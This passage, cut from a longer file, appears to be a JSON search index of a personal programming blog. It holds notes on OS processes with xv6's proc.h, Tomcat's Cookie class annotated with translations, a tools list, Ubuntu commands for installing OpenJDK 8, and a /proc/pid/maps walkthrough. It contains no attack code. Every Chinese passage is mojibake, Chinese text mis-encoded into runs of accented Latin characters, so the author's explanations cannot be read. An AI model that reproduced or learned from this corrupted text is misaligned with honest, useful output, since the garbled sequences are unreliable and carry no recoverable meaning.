ä¸­çš„è¿›ç¨‹çš„ context switchè¿™ä¸ªæœºåˆ¶. policies are algorithms for making some kind of decision within the OS.ç±»ä¼¼ java ä¸­å®ç°ç±», æ€ä¹ˆå®ç°è¿™ä¸ªæ¥å£å®šä¹‰çš„æ–¹æ³•. æ¯”å¦‚ OS ä¸­çš„è¿›ç¨‹è°ƒåº¦ç­–ç•¥å°±æ˜¯ä¸ºäº†å®ç°è¿›ç¨‹ context switch. mechanisms å’Œ policies åˆ†ç¦», å’Œ java ä¸­æ¥å£å’Œå®ç°éå¸¸ç›¸ä¼¼. å®é™…ä¸Šè¿™ä¹Ÿæ˜¯è½¯ä»¶è®¾è®¡çš„åŸåˆ™. OS æœ¬èº«ä¹Ÿæ˜¯è½¯ä»¶.","data-structures#data structures":" ä»¥ä¸‹æ˜¯ xv6 è¿™ä¸ª MIT æ•™å­¦ OS çš„ proc.h\n// Per-CPU state struct cpu { uchar apicid; // Local APIC ID struct context *scheduler; // swtch() here to enter scheduler struct taskstate ts; // Used by x86 to find stack for interrupt struct segdesc gdt[NSEGS]; // x86 global descriptor table , æ‹¿ç€ GDT ä½¿ç”¨å†…å­˜ volatile uint started; // Has the CPU started? int ncli; // Depth of pushcli nesting. int intena; // Were interrupts enabled before pushcli? struct proc *proc; // The process running on this cpu or null }; extern struct cpu cpus[NCPU]; extern int ncpu; //PAGEBREAK: 17 // Saved registers for kernel context switches. // Don't need to save all the segment registers (%cs, etc), // because they are constant across kernel contexts. // Don't need to save %eax, %ecx, %edx, because the // x86 convention is that the caller has saved them. // Contexts are stored at the bottom of the stack they // describe; the stack pointer is the address of the context. // The layout of the context matches the layout of the stack in swtch.S // at the \"Switch stacks\" comment. Switch doesn't save eip explicitly, // but it is on the stack and allocproc() manipulates it. struct context { uint edi; uint esi; uint ebx; uint ebp; uint eip; }; enum procstate { UNUSED, EMBRYO, SLEEPING, RUNNABLE, RUNNING, ZOMBIE }; // Per-process state struct proc { uint sz; // Size of process memory (bytes) åˆ†é…çš„å†…å­˜å¤§å° pde_t* pgdir; // Page table é¡µè¡¨ char *kstack; // Bottom of kernel stack for this process enum procstate state; // Process state è¿›ç¨‹çŠ¶æ€ int pid; // Process ID struct proc *parent; // Parent process çˆ¶è¿›ç¨‹ struct trapframe *tf; // Trap frame for current syscall struct context *context; // swtch() here to run process void *chan; // If non-zero, sleeping on chan int killed; // If non-zero, have been killed struct file *ofile[NOFILE]; // Open files struct inode *cwd; // Current directory char name[16]; // Process name (debugging) }; // Process memory is laid out contiguously, low addresses first: // text // original data and bss // fixed-size stack // expandable heap ","physical-organization-of-a-modern-system#physical organization of a modern system":"","process-api#process API":"create destroy kill a process or halt it\nwait miscellaneous control suspend process, stop it from running for a while resume process, contine it running\nstatus ","process-creation-a-little-detail#process creation: a little detail":" æŠŠç¨‹åºä»ç£ç›˜åŠ è½½åˆ°å†…å­˜. é—®é¢˜æ¥äº†:\næ˜¯è¦å…¨éƒ¨åŠ è½½åˆ°å†…å­˜å—? (eagerly) è¿˜æ˜¯éƒ¨åˆ†åŠ è½½åˆ°å†…å­˜? (lazy, paging) æŠ‘æˆ–å†…å­˜æ ¹æœ¬ä¸å¤Ÿå­˜æ”¾æ•´ä¸ªç¨‹åº? (swapping) å¯åŠ¨ç¨‹åºçš„å¿…è¦ä»£ç å’Œæ•°æ®åŠ è½½äº†å—? (ä¸€ç³»åˆ— run-time è®¾ç½®) åˆ†é…ä¾›å‡½æ•°æ‰§è¡Œçš„ run-time stack(or just stack). åœ¨ C è¯­è¨€ä¸­, ç”¨æ¥å­˜æ”¾ function parameters, local variables, return addresses, æƒ³ä¸€æƒ³ main çš„å‡½æ•°å‚æ•° argc,argv, åº”è¯¥å°±æ˜¯ OS åˆå§‹åŒ–çš„. åˆ†é…/å›æ”¶ heap. (malloc å’Œ free). set up related I/O execute program, è·³åˆ° entry point, ä¹Ÿå°±æ˜¯ main(). ","process-states#process states":"ç®€å•æ¥è¯´, åˆ†ä¸º 3 ç§çŠ¶æ€:\nrunning a process is running on a processor, which means it is executing instructions\nready a process is ready to run but for some reason the OS has chosen not run it at this given moment\nblocked a process has performmed some kind of operation that makes it not ready to run until some other event takes place. A common example: when a process initiates an I/O request to a disk, it becomes blocked and thus some other process can use the processor","reference#reference":" linux process\nthree easy pieces\nfile descriptor\nxv6-proc\nä¸­æ–­","summary#summary":"low-level(mechanisms) å®ç°è¿›ç¨‹åŠŸèƒ½\nhigh-level(policies)  è°ƒåº¦ç­–ç•¥\næœºåˆ¶å’Œç­–ç•¥åˆåœ¨ä¸€èµ·, å®ç° CPU çš„è™šæ‹ŸåŒ–","the-abstracttion-a-process#the abstracttion: a process":"address space å­˜æ”¾ç¨‹åºçš„ instructions å’Œ data.\nprogram counter ç¨‹åºå¯„å­˜å™¨, ä¸ºäº†å®ç° process çš„ stop å’Œ run, éœ€è¦çŸ¥é“æ‰§è¡Œåˆ°å“ªä¸€æ¡æŒ‡ä»¤äº†.\nstack pointer function parameters, local variables, return addresses\nio è¿›ç¨‹é»˜è®¤æ‰“å¼€ stdin(0), stdout(1), stderr(2) è¿™ä¸‰ä¸ª file descriptor."},"title":"three-easy-pieces-4-process"},"/blog/tomcat-http-cookie/":{"data":{"":" package javax.servlet.http; import java.io.Serializable; import java.security.AccessController; import java.security.PrivilegedAction; import java.text.MessageFormat; import java.util.BitSet; import java.util.Locale; import java.util.ResourceBundle; /** * Creates a cookie, a small amount of information sent by a servlet to a Web * browser, saved by the browser, and later sent back to the server. * åˆ›å»ºä¸€ä¸ª cookieï¼Œ servlet å‘ç»™æµè§ˆå™¨çš„ä¸€ä¸ªå°ä¿¡æ¯ï¼Œè¢«æµè§ˆå™¨ä¿å­˜ã€‚ä¹‹åå†å‘é€ç»™æœåŠ¡å™¨ã€‚ * * A cookie's value can uniquely identify a client, so cookies are commonly used for * session management. * ä¸€ä¸ª cookie çš„å€¼å¯ä»¥å•ç‹¬çš„æ ‡è®°å‡ºä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œæ‰€ä»¥ cookies ä¸€èˆ¬è¢«ç”¨æ¥ session ç®¡ç†ã€‚å› ä¸º * http æ˜¯ä¸€ä¸ª stateless çš„åè®®ã€‚ * * \u003cp\u003e * A cookie has a name, a single value, and optional attributes such as a * comment, path and domain qualifiers, a maximum age, and a version number. * ä¸€ä¸ª cookie æœ‰ä¸€ä¸ª nameï¼Œä¸€ä¸ªå•ç‹¬çš„ valueï¼Œè¿˜æœ‰ä¸€äº›å¯é€‰çš„å±æ€§ï¼Œæ¯”å¦‚ æ³¨é‡Šï¼Œè·¯å¾„ï¼ŒåŸŸæ ‡è®° * æœ€å¤§å­˜æ´»æ—¶é—´å’Œä¸€ä¸ªç‰ˆæœ¬å·ã€‚ * document.cookie å¯ä»¥å¾—åˆ° httponly = false çš„ cookie * * * Some Web browsers have bugs in how they handle the optional attributes, so * use them sparingly to improve the interoperability of your servlets. * ä¸€äº› web browsers åœ¨å¤„æ€æ ·å¤„ç†å¯é€‰çš„å±æ€§æœ‰ bugsã€‚æé«˜ servlets çš„äº’æ“ä½œæ€§ï¼Œè¯·æ…ç”¨ã€‚ * \u003cp\u003e * The servlet sends cookies to the browser by using the * {@link HttpServletResponse#addCookie} method, which adds fields to HTTP * response headers to send cookies to the browser, one at a time. The browser * is expected to support 20 cookies for each Web server, 300 cookies total, and * may limit cookie size to 4 KB each. * servlet ç”¨ HttpServletResponse#addCookie å‘ http çš„ç›¸åº”å¤´æ·»åŠ  field, ä¹‹åå‘é€ç»™æµè§ˆå™¨. * æµè§ˆå™¨æ”¯æŒæ¯ä¸€ä¸ª web server ä¿å­˜ 20 ä¸ª cookie. æ¯ä¸€ä¸ª cookie çš„ size å¯èƒ½è¢«é™åˆ¶ä¸º 4 * * \u003cp\u003e * The browser returns cookies to the servlet by adding fields to HTTP request * headers. * æµè§ˆå™¨é€šè¿‡å‘ http è¯·æ±‚å¤´æ·»åŠ  cookies çš„æ–¹å¼è¿”å›ç»™æœåŠ¡å™¨. * * Cookies can be retrieved from a request by using the * {@link HttpServletRequest#getCookies} method. Several cookies might have the * same name but different path attributes. * æœåŠ¡å™¨é€šè¿‡ HttpServletRequest#getCookies ä»è¯·æ±‚ä¸­æå– cookies. * ä¸€äº› cookie å¯èƒ½æœ‰ç›¸åŒçš„ name ä½†æ˜¯æœ‰ä¸åŒçš„ path attribute. * * \u003cp\u003e * Cookies affect the caching of the Web pages that use them. HTTP 1.0 does not * cache pages that use cookies created with this class. This class does not * support the cache control defined with HTTP 1.1. * \u003cp\u003e * This class supports both the RFC 2109 and the RFC 6265 specifications. * * By default, cookies are created using RFC 6265. * é»˜è®¤çš„, cookie ç”Ÿæˆæ–¹å¼é‡‡ç”¨ RFC 6265. æœ¬è´¨æ‰€æœ‰çš„ Cookie éƒ½æ˜¯æŒ‰è§„èŒƒç”Ÿæˆçš„. */ public class Cookie implements Cloneable, Serializable { // æ ¡éªŒ Cookie name private static final CookieNameValidator validation; static { boolean strictServletCompliance; // ä¸¥æ ¼çš„ servlet boolean strictNaming; boolean allowSlash; String propStrictNaming; String propFwdSlashIsSeparator; if (System.getSecurityManager() == null) { strictServletCompliance = Boolean.getBoolean( \"org.apache.catalina.STRICT_SERVLET_COMPLIANCE\"); propStrictNaming = System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.STRICT_NAMING\"); propFwdSlashIsSeparator = System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.FWD_SLASH_IS_SEPARATOR\"); } else { strictServletCompliance = AccessController.doPrivileged( new PrivilegedAction\u003cBoolean\u003e() { @Override public Boolean run() { return Boolean.valueOf(System.getProperty( \"org.apache.catalina.STRICT_SERVLET_COMPLIANCE\")); } } ).booleanValue(); propStrictNaming = AccessController.doPrivileged( new PrivilegedAction\u003cString\u003e() { @Override public String run() { return System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.STRICT_NAMING\"); } } ); propFwdSlashIsSeparator = AccessController.doPrivileged( new PrivilegedAction\u003cString\u003e() { @Override public String run() { return System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.FWD_SLASH_IS_SEPARATOR\"); } } ); } if (propStrictNaming == null) { strictNaming = strictServletCompliance; } else { strictNaming = Boolean.parseBoolean(propStrictNaming); } if (propFwdSlashIsSeparator == null) { allowSlash = !strictServletCompliance; } else { allowSlash = !Boolean.parseBoolean(propFwdSlashIsSeparator); } if (strictNaming) { validation = new RFC2109Validator(allowSlash); } else { validation = new RFC6265Validator(); } } private static final long serialVersionUID = 1L; private final String name; // cookie name ä¸€æ—¦åˆ›å»ºä¸èƒ½è¢«ä¿®æ”¹ private String value; // cookie value private int version = 0; // ;Version=1 ... means RFC 2109 style // é»˜è®¤çš„æ˜¯ RFC 6265 // // Attributes encoded in the header's cookie fields. // private String comment; // ;Comment=VALUE ... describes cookie's use private String domain; // ;Domain=VALUE ... domain that sees cookie å¯ä»¥çœ‹åˆ° cookie çš„ domain private int maxAge = -1; // ;Max-Age=VALUE ... cookies auto-expire private String path; // ;Path=VALUE ... URLs that see the cookie å¯ä»¥çœ‹åˆ° cookie çš„ urls private boolean secure; // ;Secure ... e.g. use SSL å¯ç”¨ ssl private boolean httpOnly; // Not in cookie specs, but supported by browsers ä¸åœ¨ cookie è§„èŒƒé‡Œ, ä½†æ˜¯è¢«æµè§ˆå™¨æ”¯æŒ /** * Constructs a cookie with a specified name and value. * \u003cp\u003e * The name must conform to RFC 2109. cookie name å¿…é¡»éµå¾ª RFC 2109. æ²¡åŠæ³•,è§„èŒƒå°±æ˜¯ç‰›å•Š * That means it can contain only ASCII * alphanumeric characters and cannot contain commas, semicolons, or white * space or begin with a $ character. The cookie's name cannot be changed * after creation. * è¿™æ„å‘³ç€ cookie name åªèƒ½åŒ…å« ASCII çš„å­—æ¯, æ•°å­—, ä¸èƒ½åŒ…æ‹¬é€—å·, åˆ†å·, ç©ºæ ¼, æˆ–è€…ä»¥ * $ å¼€å¤´. cookie name ä¸€æ—¦åˆ›å»ºä¸èƒ½è¢«ä¿®æ”¹. * * \u003cp\u003e * The value can be anything the server chooses to send. Its value is * probably of interest only to the server. The cookie's value can be * changed after creation with the \u003ccode\u003esetValue\u003c/code\u003e method. * server å¯ä»¥é€šè¿‡ cookie value å‘é€ä»»ä½•ä¸œè¥¿. * \u003cp\u003e * By default, cookies are created according to the Netscape cookie * specification. The version can be changed with the * \u003ccode\u003esetVersion\u003c/code\u003e method. * * @param name * a \u003ccode\u003eString\u003c/code\u003e specifying the name of the cookie * @param value * a \u003ccode\u003eString\u003c/code\u003e specifying the value of the cookie * @throws IllegalArgumentException * if the cookie name contains illegal characters (for example, * a comma, space, or semicolon) or it is one of the tokens * reserved for use by the cookie protocol * @see #setValue * @see #setVersion */ public Cookie(String name, String value) { // é¦–å…ˆè¿›è¡Œ cookie name çš„æ ¡éªŒ validation.validate(name); this.name = name; this.value = value; } /** * Specifies a comment that describes a cookie's purpose. * æè¿°è¿™ä¸ª cookie çš„ç›®çš„ * The comment is useful if the browser presents the cookie to the user. Comments are not * supported by Netscape Version 0 cookies. * * @param purpose * a \u003ccode\u003eString\u003c/code\u003e specifying the comment to display to the * user * @see #getComment */ public void setComment(String purpose) { comment = purpose; } /** * Returns the comment describing the purpose of this cookie, or * \u003ccode\u003enull\u003c/code\u003e if the cookie has no comment. * * @return a \u003ccode\u003eString\u003c/code\u003e containing the comment, or * \u003ccode\u003enull\u003c/code\u003e if none * @see #setComment */ public String getComment() { return comment; } /** * Specifies the domain within which this cookie should be presented. * æŒ‡å®šè¿™ä¸ª cookie å¯ä»¥å‡ºç°åœ¨é‚£ä¸ª domain * \u003cp\u003e * The form of the domain name is specified by RFC 2109. A domain name * begins with a dot (\u003ccode\u003e.foo.com\u003c/code\u003e) and means that the cookie is * visible to servers in a specified Domain Name System (DNS) zone (for * example, \u003ccode\u003ewww.foo.com\u003c/code\u003e, but not \u003ccode\u003ea.b.foo.com\u003c/code\u003e). By * default, cookies are only returned to the server that sent them. * * domain name çš„å½¢å¼è¯´æ˜åœ¨ RFC 2109. domain name ä»¥ dot å¼€å¤´, è¿™æ„å‘³ç€åœ¨ä¸€ä¸ªç‰¹å®šçš„ * DNS è¿™ä¸ª cookie æ˜¯å¯è§çš„. é»˜è®¤çš„, é‚£ä¸ªæœåŠ¡å™¨å‘é€çš„ cookie è¿”å›ç»™å“ªä¸ªæœåŠ¡å™¨. * * @param pattern * a \u003ccode\u003eString\u003c/code\u003e containing the domain name within which * this cookie is visible; form is according to RFC 2109 * @see #getDomain */ public void setDomain(String pattern) { domain = pattern.toLowerCase(Locale.ENGLISH); // IE allegedly needs this } /** * Returns the domain name set for this cookie. The form of the domain name * is set by RFC 2109. * * @return a \u003ccode\u003eString\u003c/code\u003e containing the domain name * @see #setDomain */ public String getDomain() { return domain; } /** * Sets the maximum age of the cookie in seconds. * cookie æœ€å¤§å­˜æ´»çš„ç§’æ•° * \u003cp\u003e * A positive value indicates that the cookie will expire after that many * seconds have passed. Note that the value is the \u003ci\u003emaximum\u003c/i\u003e age when * the cookie will expire, not the cookie's current age. * ä¸€ä¸ªæ­£æ•°è¡¨æ˜ cookie å°†åœ¨ maximun age ç§’æ•°åè¿‡æœŸ. * \u003cp\u003e * A negative value means that the cookie is not stored persistently and * will be deleted when the Web browser exits. A zero value causes the * cookie to be deleted. * * ä¸€ä¸ªè´Ÿæ•°è¡¨ç¤º cookie ä¸ä¼šè¢«æ°¸ä¹…å­˜å‚¨, æµè§ˆå™¨é€€å‡ºæ—¶å°†è¢«åˆ é™¤. * 0 åˆ é™¤è¿™ä¸ª cookie * * @param expiry * an integer specifying the maximum age of the cookie in * seconds; if negative, means the cookie is not stored; if zero, * deletes the cookie * @see #getMaxAge */ public void setMaxAge(int expiry) { maxAge = expiry; } /** * Returns the maximum age of the cookie, specified in seconds, By default, * \u003ccode\u003e-1\u003c/code\u003e indicating the cookie will persist until browser * shutdown. * * @return an integer specifying the maximum age of the cookie in seconds; if * negative, means the cookie persists until browser shutdown * @see #setMaxAge */ public int getMaxAge() { return maxAge; } /** * Specifies a path for the cookie to which the client should return the * cookie. * æŒ‡å®šä¸€ä¸ª path, è¡¨ç¤ºå“ªä¸€ä¸ª client åº”è¯¥æŠŠè¿™ä¸ª cookie è¿”è¿˜ç»™æœåŠ¡å™¨. * * \u003cp\u003e * The cookie is visible to all the pages in the directory you specify, and * all the pages in that directory's subdirectories. A cookie's path must * include the servlet that set the cookie, for example, \u003ci\u003e/catalog\u003c/i\u003e, * which makes the cookie visible to all directories on the server under * \u003ci\u003e/catalog\u003c/i\u003e. * \u003cp\u003e * Consult RFC 2109 (available on the Internet) for more information on * setting path names for cookies. * * @param uri * a \u003ccode\u003eString\u003c/code\u003e specifying a path * @see #getPath */ public void setPath(String uri) { path = uri; } /** * Returns the path on the server to which the browser returns this cookie. * The cookie is visible to all subpaths on the server. * * @return a \u003ccode\u003eString\u003c/code\u003e specifying a path that contains a servlet * name, for example, \u003ci\u003e/catalog\u003c/i\u003e * @see #setPath */ public String getPath() { return path; } /** * Indicates to the browser whether the cookie should only be sent using a * secure protocol, such as HTTPS or SSL. * \u003cp\u003e * The default value is \u003ccode\u003efalse\u003c/code\u003e. * * @param flag * if \u003ccode\u003etrue\u003c/code\u003e, sends the cookie from the browser to the * server only when using a secure protocol; if * \u003ccode\u003efalse\u003c/code\u003e, sent on any protocol * @see #getSecure */ public void setSecure(boolean flag) { secure = flag; } /** * Returns \u003ccode\u003etrue\u003c/code\u003e if the browser is sending cookies only over a * secure protocol, or \u003ccode\u003efalse\u003c/code\u003e if the browser can send cookies * using any protocol. * * @return \u003ccode\u003etrue\u003c/code\u003e if the browser uses a secure protocol; * otherwise, \u003ccode\u003etrue\u003c/code\u003e * @see #setSecure */ public boolean getSecure() { return secure; } /** * Returns the name of the cookie. The name cannot be changed after * creation. * * @return a \u003ccode\u003eString\u003c/code\u003e specifying the cookie's name */ public String getName() { return name; } /** * Assigns a new value to a cookie after the cookie is created. If you use a * binary value, you may want to use BASE64 encoding. * cookie è¢«åˆ›å»ºå, ç»™ value æŒ‡å®šä¸€ä¸ªå€¼. å¦‚æœä½¿ç”¨äºŒè¿›åˆ¶çš„å€¼, é‡‡ç”¨ BASE64 çš„ç¼–ç æ–¹å¼. * * \u003cp\u003e * With Version 0 cookies, values should not contain white space, brackets, * parentheses, equals signs, commas, double quotes, slashes, question * marks, at signs, colons, and semicolons. Empty values may not behave the * same way on all browsers. * * @param newValue * a \u003ccode\u003eString\u003c/code\u003e specifying the new value * @see #getValue * @see Cookie */ public void setValue(String newValue) { value = newValue; } /** * Returns the value of the cookie. * * @return a \u003ccode\u003eString\u003c/code\u003e containing the cookie's present value * @see #setValue * @see Cookie */ public String getValue() { return value; } /** * Returns the version of the protocol this cookie complies with. Version 1 * complies with RFC 2109, and version 0 complies with the original cookie * specification drafted by Netscape. Cookies provided by a browser use and * identify the browser's cookie version. * * @return 0 if the cookie complies with the original Netscape specification; * 1 if the cookie complies with RFC 2109 è¢« RFC 6265 æ·˜æ±° * @see #setVersion */ public int getVersion() { return version; } /** * Sets the version of the cookie protocol this cookie complies with. * Version 0 complies with the original Netscape cookie specification. * version 0 éµå®ˆåŸå§‹çš„ netscape cookie è¯´æ˜ * Version 1 complies with RFC 2109. * version 1 éµå®ˆ RFC 2109 è§„èŒƒ * \u003cp\u003e * Since RFC 2109 is still somewhat new, consider version 1 as experimental; * do not use it yet on production sites. * * @param v * 0 if the cookie should comply with the original Netscape * specification; 1 if the cookie should comply with RFC 2109 * @see #getVersion */ public void setVersion(int v) { version = v; } /** * Overrides the standard \u003ccode\u003ejava.lang.Object.clone\u003c/code\u003e method to * return a copy of this cookie. */ @Override public Object clone() { try { return super.clone(); } catch (CloneNotSupportedException e) { throw new RuntimeException(e); } } /** * Sets the flag that controls if this cookie will be hidden from scripts on * the client side. * * true ä¸èƒ½è¢« js document.cookie æ“ä½œ * * @param httpOnly The new value of the flag * * @since Servlet 3.0 */ public void setHttpOnly(boolean httpOnly) { this.httpOnly = httpOnly; } /** * Gets the flag that controls if this cookie will be hidden from scripts on * the client side. * * @return \u003ccode\u003etrue\u003c/code\u003e if the cookie is hidden from scripts, else * \u003ccode\u003efalse\u003c/code\u003e * @since Servlet 3.0 */ public boolean isHttpOnly() { return httpOnly; } } class CookieNameValidator { // æ‹¿åˆ° properties æ–‡ä»¶çš„æ–¹æ³• ResourceBundle private static final String LSTRING_FILE = \"javax.servlet.http.LocalStrings\"; protected static final ResourceBundle lStrings = ResourceBundle.getBundle(LSTRING_FILE); protected final BitSet allowed; protected CookieNameValidator(String separators) { allowed = new BitSet(128); allowed.set(0x20, 0x7f); // any CHAR except CTLs or separators for (int i = 0; i \u003c separators.length(); i++) { char ch = separators.charAt(i); allowed.clear(ch); } } void validate(String name) { // cookie name ä¸å…è®¸ä¸º null æˆ–è€…é•¿åº¦ä¸º 0 if (name == null || name.length() == 0) { throw new IllegalArgumentException(lStrings.getString(\"err.cookie_name_blank\")); } if (!isToken(name)) { String errMsg = lStrings.getString(\"err.cookie_name_is_token\"); throw new IllegalArgumentException(MessageFormat.format(errMsg, name)); } } private boolean isToken(String possibleToken) { int len = possibleToken.length(); for (int i = 0; i \u003c len; i++) { char c = possibleToken.charAt(i); if (!allowed.get(c)) { return false; } } return true; } } class RFC6265Validator extends CookieNameValidator { private static final String RFC2616_SEPARATORS = \"()\u003c\u003e@,;:\\\\\\\"/[]?={} \\t\"; RFC6265Validator() { super(RFC2616_SEPARATORS); } } class RFC2109Validator extends RFC6265Validator { RFC2109Validator(boolean allowSlash) { // special treatment to allow for FWD_SLASH_IS_SEPARATOR property if (allowSlash) { allowed.set('/'); } } @Override void validate(String name) { super.validate(name); // cookie name ä¸å…è®¸ $ å¼€å¤´ if (name.charAt(0) == '$') { String errMsg = lStrings.getString(\"err.cookie_name_is_token\"); throw new IllegalArgumentException(MessageFormat.format(errMsg, name)); } } } "},"title":"tomcat-http-cookie"},"/blog/tools-for-me/":{"data":{"assembly#assembly":"","base64#base64":"","code-format#code format":"","company#company":"programmingjava decompiler-Luyten decompiler-cfr byte-code-viewer jclasslib assembly godbolt json json-runoob json-online regexp regexp-jex.im regexp-regexr regexp-regexper hex hex converter hex editor html html beautify base64 base64 code format code format url json format unicode unicode for you shell oh-my-zsh starship workingpc snipaste mubu process on screen-recorder reinstall os multibootusb universal usb installer rufus entertainmentvideo online downloader-you-get downloader-motrix downloader-Xdown converter audio-converter movie cupfox agmov picture waifu2x papers-anwanqi ilovepapers file ilovepdf html to pdf typing practice typing https://qwerty.kaiyi.cool/ jobcompany tianyancha resume æœ¨åŠç®€å† ","entertainment#entertainment":"","file#file":"","hex#hex":"","html#html":"","java#java":"","job#job":"","json#json":"","movie#movie":"","pc#pc":"","picture#picture":"","programming#programming":"","regexp#regexp":"","reinstall-os#reinstall os":"","shell#shell":"","typing#typing":"","unicode#unicode":"","video#video":"","working#working":""},"title":"tools-for-me"},"/blog/ubuntu18-04-install-openjdk8/":{"data":{"å®‰è£…-openjdk8#å®‰è£… openjdk8":"","æ‰§è¡Œæ›´æ–°#æ‰§è¡Œæ›´æ–°":"","æ·»åŠ -openjdk8-çš„ç¬¬ä¸‰æ–¹æº#æ·»åŠ  openjdk8 çš„ç¬¬ä¸‰æ–¹æº":"","ç¡®è®¤å®‰è£…æˆåŠŸ#ç¡®è®¤å®‰è£…æˆåŠŸ":"æ·»åŠ  openjdk8 çš„ç¬¬ä¸‰æ–¹æº sudo add-apt-repository ppa:openjdk-r/ppa ppa (Personal Package Achives)\næ‰§è¡Œæ›´æ–° apt-get update\nå®‰è£… openjdk8 sudo apt-get install openjdk-8-jdk\né€‰æ‹©ç‰ˆæœ¬ sudo update-alternatives - -config java\nç¡®è®¤å®‰è£…æˆåŠŸ java -version","é€‰æ‹©ç‰ˆæœ¬#é€‰æ‹©ç‰ˆæœ¬":""},"title":"ubuntu18.04-install-openjdk8"},"/blog/virtual-memory-address-explore/":{"data":{"heap#heap":"556a8c01b000-556a8c03c000 å¯ä»¥çœ‹åˆ° heap çš„åœ°å€ï¼Œæ˜¯æ¯”è¾ƒå°çš„åœ°å€æ®µã€‚","heap-ä¸-stack-ä¼šä¸ä¼šç›¸äº’è¦†ç›–#heap ä¸ stack ä¼šä¸ä¼šç›¸äº’è¦†ç›–ï¼Ÿ":"æŸ¥çœ‹ /proc/pid/maps è®¡ç®—ï¼š\n(low address stack - high address heap) / 1024 / 1024 /1024 / 1024 = (0x7ffe91c09000 - 0x556a8c03c000) / 1024 / 1024 /1024 / 1024 = 42TB å¯ä»¥çœ‹å‡ºç›¸å·®æœ‰ 42TB çš„ç©ºé—´ã€‚å°±ç®—çœŸçš„è¦†ç›–äº†ï¼Œå†…æ ¸ä¼šç»ˆæ­¢è¿™ä¸ªç¨‹åºã€‚è¿™ä¹Ÿå°±æ˜¯è™šæ‹Ÿå†…å­˜çš„ä½œç”¨ä¹‹ä¸€ï¼Œç¨‹åºå¯ä»¥ä½¿ç”¨è¿œè¿œè¶…è¿‡å®é™…ç‰©ç†å†…å­˜çš„ç©ºé—´ã€‚","procpidmaps#/proc/pid/maps":" stardust@os:x86_64-linux-gnu$ pidof vas-explore 75599 stardust@os:x86_64-linux-gnu$ cat /proc/75599/maps 556a8a831000-556a8a837000 r--p 00000000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8a837000-556a8a86e000 r-xp 00006000 08:12 815699 /home/stardust/Desktop/rust/ vas-explore/target/debug/vas-explore # text(code segment) segment 556a8a86e000-556a8a87c000 r--p 0003d000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8a87d000-556a8a880000 r--p 0004b000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8a880000-556a8a881000 rw-p 0004e000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8c01b000-556a8c03c000 rw-p 00000000 00:00 0 [heap] # heap segment 7f5e59636000-7f5e59638000 rw-p 00000000 00:00 0 7f5e59638000-7f5e5965a000 r--p 00000000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e5965a000-7f5e597d2000 r-xp 00022000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e597d2000-7f5e59820000 r--p 0019a000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e59820000-7f5e59824000 r--p 001e7000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e59824000-7f5e59826000 rw-p 001eb000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e59826000-7f5e5982a000 rw-p 00000000 00:00 0 7f5e5982a000-7f5e5982b000 r--p 00000000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982b000-7f5e5982d000 r-xp 00001000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982d000-7f5e5982e000 r--p 00003000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982e000-7f5e5982f000 r--p 00003000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982f000-7f5e59830000 rw-p 00004000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e59830000-7f5e59836000 r--p 00000000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e59836000-7f5e59847000 r-xp 00006000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e59847000-7f5e5984d000 r--p 00017000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e5984d000-7f5e5984e000 r--p 0001c000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e5984e000-7f5e5984f000 rw-p 0001d000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e5984f000-7f5e59853000 rw-p 00000000 00:00 0 7f5e59853000-7f5e59856000 r--p 00000000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e59856000-7f5e59868000 r-xp 00003000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e59868000-7f5e5986c000 r--p 00015000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e5986c000-7f5e5986d000 r--p 00018000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e5986d000-7f5e5986e000 rw-p 00019000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e5986e000-7f5e59870000 rw-p 00000000 00:00 0 7f5e59885000-7f5e59886000 ---p 00000000 00:00 0 7f5e59886000-7f5e59888000 rw-p 00000000 00:00 0 7f5e59888000-7f5e59889000 r--p 00000000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e59889000-7f5e598ac000 r-xp 00001000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598ac000-7f5e598b4000 r--p 00024000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598b5000-7f5e598b6000 r--p 0002c000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598b6000-7f5e598b7000 rw-p 0002d000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598b7000-7f5e598b8000 rw-p 00000000 00:00 0 7ffe91c09000-7ffe91c2a000 rw-p 00000000 00:00 0 [stack] # stack segment 7ffe91c38000-7ffe91c3b000 r--p 00000000 00:00 0 [vvar] 7ffe91c3b000-7ffe91c3c000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] ","references#References":" /proc/pid/maps 